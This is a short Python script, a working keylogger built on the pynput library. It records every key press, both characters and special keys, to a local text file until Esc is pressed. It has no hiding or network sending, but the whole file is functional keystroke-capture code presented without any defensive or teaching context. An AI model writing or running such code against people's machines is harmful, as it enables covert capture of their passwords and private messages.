from pynput.keyboard import Listener

# Path to the file where key logs will be saved
log_file = "key_log.txt"

# Function to handle each key press
def on_press(key):
    with open(log_file, "a") as file:
        try:
            file.write(str(key.char))  # Log regular keys (alphanumeric)
        except AttributeError:
            file.write(f" [{key}] ")  # Log special keys like space, enter, etc.

# Function to handle key release and stop on 'Esc'
def on_release(key):
    if key == key.esc:
        # Stop the listener when 'Esc' is pressed
        return False

# Start the listener and join it to the main thread
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
